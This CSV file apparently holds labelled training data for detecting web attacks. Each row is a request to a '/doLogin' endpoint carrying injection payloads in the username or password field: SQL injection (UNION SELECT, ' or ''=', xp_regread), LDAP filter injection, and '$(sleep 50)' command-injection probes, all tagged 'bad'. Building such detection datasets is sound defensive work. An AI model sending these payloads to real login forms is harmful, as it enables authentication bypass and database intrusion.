method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,b'/login.jsp',b'',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=!&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%20$(sleep%2050)&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,1,2,1,bad
POST,b'/doLogin',"b""uid=%20'sleep%2050'&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login""",2,0,0,0,2,1,bad
POST,b'/doLogin',b'uid=%21&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%22&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,1,0,0,0,0,bad
POST,b'/doLogin',"b""uid=%22'%20or%201%20--'%22&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login""",2,2,1,0,3,0,bad
POST,b'/doLogin',b'uid=%22)%20or%20(%22a%22%3d%22a&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,4,0,1,2,0,bad
POST,b'/doLogin',b'uid=%23&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%26&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%26apos%3b%20OR&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,1,0,bad
POST,b'/doLogin',"b""uid=%26lt%3b%26gt%3b%26quot%3b'%%3b)(%26amp%3b%2b&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login""",1,0,0,1,0,0,bad
POST,b'/doLogin',b'uid=%28&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,1,0,0,bad
POST,b'/doLogin',b'uid=%29&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%2A%28%7C%28mail%3D%2A%29%29&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,2,0,0,bad
POST,b'/doLogin',b'uid=%2A%28%7C%28objectclass%3D%2A%29%29&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,2,0,0,bad
POST,b'/doLogin',b'uid=%2A%7C&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%2a%2f%2a&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%2a%7c&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%2a(%7c(mail%3d%2a))&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,2,0,0,bad
POST,b'/doLogin',b'uid=%2a(%7c(objectclass%3d%2a))&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,2,0,0,bad
POST,b'/doLogin',b'uid=%2f%2f%2a&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%2f%2f&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%2f&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',"b""uid=%3c%3e%22'%%3b)(%26%2b&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login""",1,1,0,1,0,0,bad
POST,b'/doLogin',b'uid=%3d%20%3b&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,1,0,bad
POST,b'/doLogin',"b""uid=%3d%20'&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login""",1,0,0,0,1,0,bad
POST,b'/doLogin',b'uid=%3d%20--&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,1,0,1,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=!&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%20$(sleep%2050)&btnSubmit=Login',0,0,0,1,2,1,bad
POST,b'/doLogin',"b""uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%20'sleep%2050'&btnSubmit=Login""",2,0,0,0,2,1,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%21&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%22&btnSubmit=Login',0,1,0,0,0,0,bad
POST,b'/doLogin',"b""uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%22'%20or%201%20--'%22&btnSubmit=Login""",2,2,1,0,3,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%22)%20or%20(%22a%22%3d%22a&btnSubmit=Login',0,4,0,1,2,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%23&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%26&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%26apos%3b%20OR&btnSubmit=Login',0,0,0,0,1,0,bad
POST,b'/doLogin',"b""uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%26lt%3b%26gt%3b%26quot%3b'%%3b)(%26amp%3b%2b&btnSubmit=Login""",1,0,0,1,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%28&btnSubmit=Login',0,0,0,1,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%29&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%2A%28%7C%28mail%3D%2A%29%29&btnSubmit=Login',0,0,0,2,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%2A%28%7C%28objectclass%3D%2A%29%29&btnSubmit=Login',0,0,0,2,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%2A%7C&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%2a%2f%2a&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%2a%7c&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%2a(%7c(mail%3d%2a))&btnSubmit=Login',0,0,0,2,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%2a(%7c(objectclass%3d%2a))&btnSubmit=Login',0,0,0,2,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%2f%2f%2a&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%2f%2f&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%2f&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',"b""uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%3c%3e%22'%%3b)(%26%2b&btnSubmit=Login""",1,1,0,1,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%3d%20%3b&btnSubmit=Login',0,0,0,0,1,0,bad
POST,b'/doLogin',"b""uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%3d%20'&btnSubmit=Login""",1,0,0,0,1,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%3d%20--&btnSubmit=Login',0,0,1,0,1,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%5cx23&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%5cx27%5cx4F%5cx52%20SELECT%20%2a&btnSubmit=Login',0,0,0,0,2,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%5cx27%5cx6F%5cx72%20SELECT%20%2a&btnSubmit=Login',0,0,0,0,2,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%5cx27&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%5cx27UNION%20SELECT&btnSubmit=Login',0,0,0,0,1,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%5cx3D%20%5cx27&btnSubmit=Login',0,0,0,0,1,0,bad
POST,b'/doLogin',"b""uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%5cx3D%20%5cx3B'&btnSubmit=Login""",1,0,0,0,1,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%7C&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=%7c&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',"b""uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw='%20%3b&btnSubmit=Login""",1,0,0,0,1,0,bad
POST,b'/doLogin',"b""uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw='%20(select%20top%201&btnSubmit=Login""",1,0,0,1,3,1,bad
POST,b'/doLogin',"b""uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw='%20--&btnSubmit=Login""",1,0,1,0,1,0,bad
POST,b'/doLogin',"b""uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw='%20UNION%20ALL%20SELECT&btnSubmit=Login""",1,0,0,0,3,0,bad
POST,b'/doLogin',"b""uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw='%20UNION%20SELECT&btnSubmit=Login""",1,0,0,0,2,0,bad
POST,b'/doLogin',"b""uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw='%20or%20''%3d'&btnSubmit=Login""",4,0,0,0,2,0,bad
POST,b'/doLogin',"b""uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw='%20or%20(EXISTS)&btnSubmit=Login""",1,0,0,1,2,0,bad
POST,b'/doLogin',"b""uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw='%20or%20uid%20like%20'%&btnSubmit=Login""",2,0,0,0,4,0,bad
POST,b'/doLogin',"b""uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw='%20or%20uname%20like%20'%&btnSubmit=Login""",2,0,0,0,4,0,bad
POST,b'/doLogin',"b""uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw='%20or%20user%20like%20'%&btnSubmit=Login""",2,0,0,0,4,0,bad
POST,b'/doLogin',"b""uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw='%20or%20userid%20like%20'%&btnSubmit=Login""",2,0,0,0,4,0,bad
POST,b'/doLogin',"b""uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw='%20or%20username%20like%20'%&btnSubmit=Login""",2,0,0,0,4,0,bad
POST,b'/doLogin',"b""uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw='%3b%20exec%20xp_regread&btnSubmit=Login""",1,0,0,0,2,0,bad
POST,b'/doLogin',"b""uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw='%7c%7cUTL_HTTP%2eREQUEST&btnSubmit=Login""",1,0,0,0,0,0,bad
POST,b'/doLogin',"b""uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw='&btnSubmit=Login""",1,0,0,0,0,0,bad
POST,b'/doLogin',"b""uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=')%20or%20('a'%3d'a&btnSubmit=Login""",4,0,0,1,2,0,bad
POST,b'/doLogin',"b""uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=')%20or%20('x'%3d'x&btnSubmit=Login""",4,0,0,1,2,0,bad
POST,b'/doLogin',"b""uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw='sqlattempt1&btnSubmit=Login""",1,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=(&btnSubmit=Login',0,0,0,1,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=(sqlattempt2)&btnSubmit=Login',0,0,0,1,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=)&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',"b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=,@variable&btnSubmit=Login'",0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=-&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=--&btnSubmit=Login',0,0,1,0,0,0,bad
POST,b'/doLogin',"b""uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=--'%3b&btnSubmit=Login""",1,0,1,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=--sp_password&btnSubmit=Login',0,0,1,0,0,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=1%3bSELECT%20%2a&btnSubmit=Login',0,0,0,0,1,0,bad
POST,b'/doLogin',b'uid=%5Cx27%5Cx6F%5Cx72+SELECT+*&passw=@variable&btnSubmit=Login',0,0,0,0,0,0,bad
